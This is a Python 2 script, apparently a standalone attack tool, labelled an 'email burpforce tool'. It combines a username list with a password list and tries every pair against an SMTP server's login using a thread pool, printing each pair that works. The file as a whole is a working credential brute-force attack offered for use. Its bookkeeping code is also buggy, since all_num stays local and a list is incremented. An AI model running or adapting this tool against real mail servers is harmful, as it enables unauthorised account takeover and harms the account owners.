#!/usr/local/bin/python
# -*- coding:utf-8 -*- 
# author: emchen
from threadpool import *
import smtplib
import argparse

def burp(arg):
    global process, flag
    if process % 50 == 0 and flag:
        flag = False
        try:
            print process/all_num
            flag = True
        except:
            flag = True
            pass

    try:
        host, user, passwd = arg['host'], arg['user'], arg['passwd']
        mail = smtplib.SMTP() 
        mail.connect(host, 25)
        mail.login(user, passwd) 
        process += 1
        return '%s : %s'%(user, passwd)
    except:
        process += 1
        return ''

def callback(req, res):
    print res
    if res.__len__() > 0:
        print '[+] '+res
        final_result.append(res)
        final_count += 1

def main(seq=[{'host':'', 'user':'', 'passwd':''}], poolsize=20):
    pool = ThreadPool(poolsize)
    requests = makeRequests(burp, seq, callback)
    [pool.putRequest(req) for req in requests]
    pool.wait()

def menu():
    seq = []
    userfile = [x.strip() for x in open(args.userfile, 'r').read().split('\n') if x]
    passfile = [x.strip() for x in open(args.passfile, 'r').read().split('\n') if x]
    for u in userfile:
        for p in passfile:
            info = {}
            info['host'] = args.server
            info['user'] = u
            info['passwd'] = p
            seq.append(info)
    all_num = len(seq)
    main(seq=seq, poolsize=args.thread)


if __name__ == '__main__':
    final_result = []
    final_count = []
    process = 0
    all_num = 0
    flag = True
    parser = argparse.ArgumentParser(description="email burpforce tool")
    parser.add_argument("-s", "--server", help="email host server", required=True)
    parser.add_argument("-u", "--userfile", help="email address list file", required=True)
    parser.add_argument("-p", "--passfile", help="email password list file", required=True)
    parser.add_argument("-t", "--thread", type=int, default=20, help="thread number DEFAULT=20")
    args = parser.parse_args()
    menu()
